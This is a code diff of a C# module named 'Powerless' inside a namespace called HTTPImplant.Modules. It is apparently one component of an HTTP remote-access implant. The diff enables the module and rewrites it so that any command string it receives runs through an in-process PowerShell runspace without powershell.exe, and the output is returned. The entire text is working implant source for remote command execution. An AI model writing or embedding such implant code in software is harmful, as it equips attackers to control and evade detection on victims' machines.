@@ -1,43 +1,39 @@
-﻿/*using System;
+﻿using System;
 using System.Collections.ObjectModel;
 using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Text;
 
 namespace HTTPImplant.Modules
 {
-    class Powerless
+    static class Powerless
     {
-        public static string Exec(string command)
+        static public string Exec(string cmd)
         {
-            Console.WriteLine("\n\nRunning " + command);
-            string output = "";
-
-            using (PowerShell ps = PowerShell.Create())
+            try
             {
-                ps.AddCommand(command);
-                try
+                Runspace runspace = RunspaceFactory.CreateRunspace();
+                runspace.Open();
+                Pipeline pipeline = runspace.CreatePipeline();
+                pipeline.Commands.AddScript(cmd);
+                pipeline.Commands.Add("Out-String");
+                Collection<PSObject> results = pipeline.Invoke();
+                StringBuilder stringBuilder = new StringBuilder();
+                foreach (PSObject obj in results)
                 {
-                    Collection<PSObject> results = ps.Invoke();
-                    if (ps.Streams.Error.Count > 0)
+                    foreach (string line in obj.ToString().Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None))
                     {
-                        foreach (var error in ps.Streams.Error)
-                        {
-                            output += "PowerShell Error: " + error.ToString() + "\n";
-                        }
-                    }
-
-                    foreach (PSObject result in results)
-                    {
-                        output += result.ToString() + "\n";
+                        stringBuilder.AppendLine(line.TrimEnd());
                     }
                 }
-                catch (Exception e)
-                {
-                    output += "Error while executing the command.\r\n" + e.Message + "\n";
-                }
+                runspace.Close();
+                return stringBuilder.ToString();
             }
-
-            return output;
+            catch (Exception e)
+            {
+                string errorText = e.Message + "\n";
+                return (errorText);
+            }
         }
     }
 }
-*/
